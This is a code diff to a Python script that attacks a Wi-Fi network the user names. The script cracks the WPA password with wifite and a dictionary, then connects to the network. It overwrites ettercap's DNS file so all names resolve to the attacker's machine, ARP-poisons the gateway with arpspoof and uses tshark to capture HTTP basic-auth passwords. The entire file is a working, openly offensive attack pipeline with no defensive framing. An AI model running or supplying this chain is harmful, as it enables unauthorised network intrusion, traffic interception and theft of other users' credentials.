@@ -2,7 +2,7 @@ import os
 import subprocess
 import sys
 
-INTERFACE_NAME = "wlan0mon"
+INTERFACE_NAME = "wlan0"
 WIFITE_PASSWORDS_FILE = "cracked.txt"
 DICT_FILE = "dict.txt"
 
@@ -11,13 +11,23 @@ def setup():
     os.system("rm {}".format(WIFITE_PASSWORDS_FILE))
 
 def crackWPA(essid, dictFile):
-    subprocess.Popen(["wifite", "-i", INTERFACE_NAME, "--no-wps", "-e", essid, "--verbose", "--random-mac", "--clients-only", "--wpa", "--dict" dictFile], stdout=subprocess.PIPE, stderr=subprocess.PIPE).wait()
+    subprocess.Popen(["wifite", "-i", INTERFACE_NAME, "--no-wps", "-e", essid, "--verbose", "--wpa", "--dict", dictFile]).wait()
     with open(WIFITE_PASSWORDS_FILE, "r") as passwords:
-        return passwords.readlines()[-1]
+        for line in passwords.readlines():
+            if '"key":' in line:
+                print(line.split()[-1][1:-2])
+                return line.split()[-1][1:-2]
 
-def connectToNetwork(essid, password):
-    subprocess.Popen(["iwconfig", INTERFACE_NAME, "essid", essid, "key", "s:{}".format(password)], stdout=subprocess.PIPE, stderr=subprocess.PIPE).wait()
-    subprocess.Popen(["dhclient", INTERFACE_NAME], stdout=subprocess.PIPE, stderr=subprocess.PIPE).wait()
+def connectToNetwork():
+    # subprocess.Popen(["nmcli", "d", "wifi", "connect", essid, "password", password], stdout=subprocess.PIPE, stderr=subprocess.PIPE).wait()
+    # input("")
+    # print("connecting to network")
+    os.system("sudo ifconfig {} down".format(INTERFACE_NAME))
+    os.system("sudo iwconfig {} mode managed".format(INTERFACE_NAME))
+    os.system("sudo ifconfig {} up".format(INTERFACE_NAME))
+    #os.system("sudo nmcli d wifi connect Vic password praetorian")
+    #subprocess.Popen(["sudo", "nmcli", "d", "wifi", "connect", essid, "password", password]).wait()
+    pass
 
 def getGatewayIP():
     with subprocess.Popen(["ip", "route"], stdout=subprocess.PIPE) as proc:
@@ -27,25 +37,41 @@ def getGatewayIP():
                 return line.split()[2]
         raise Exception("Gateway IP not found.")
 
-def sniffTraffic():
-    # Log traffic to a file (i.e. dsniff -w dumpfile.pcap)
-    pass
+def getMachineIPAddress():
+    cmd = "hostname -I | awk \'{print $1}\'"
+    ip_addr = str(os.popen(cmd).read()).strip('\n')
+    return ip_addr
 
-def parsePasswords():
-    # Parse log file for plaintext passwords
-    pass
+def ettercapConfiguration(ip_address):
+    with open("/etc/ettercap/etter.dns", "w+") as etter:
+        etter.write("* A {}".format(ip_address))
+        etter.write("* PTR {}".format(ip_address))
+    
 
 def arpPoison(interface_name, host):
     arpSpoofProc = subprocess.Popen(["arpspoof", "-i", interface_name, host], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     return arpSpoofProc
 
+def sniffPasswords():
+    return subprocess.Popen(["tshark", "-ni", INTERFACE_NAME, "-T", "fields", "-e", "http.authbasic", "-Y", 'http.authbasic'])
+
 if __name__ == "__main__":
     setup()
     essid = input("Enter the name of the network you'd like to attack:")
     password = crackWPA(essid, DICT_FILE)
-    connectToNetwork(essid, password)
+    connectToNetwork()
+    input("Password found! Connect to '{}' with password '{}' and press enter when ready".format(essid, password))
+    print("ARP Poisoning...")
+
+    # ettercap
+    ip = getMachineIPAddress()
+    ettercapConfiguration(ip)
+    # ettercap
+
     gatewayIP = getGatewayIP()
-    arpSpoofProc = arpPoison(monitorModeInterface, gatewayIP)
-    sniffTraffic()
-    parsePasswords()
+    arpSpoofProc = arpPoison(INTERFACE_NAME, gatewayIP)
+    print("Sniffing passwords...")
+    sniffProc = sniffPasswords()
+    input("Press enter to stop sniffing")
+    sniffProc.terminate()
     arpSpoofProc.terminate()
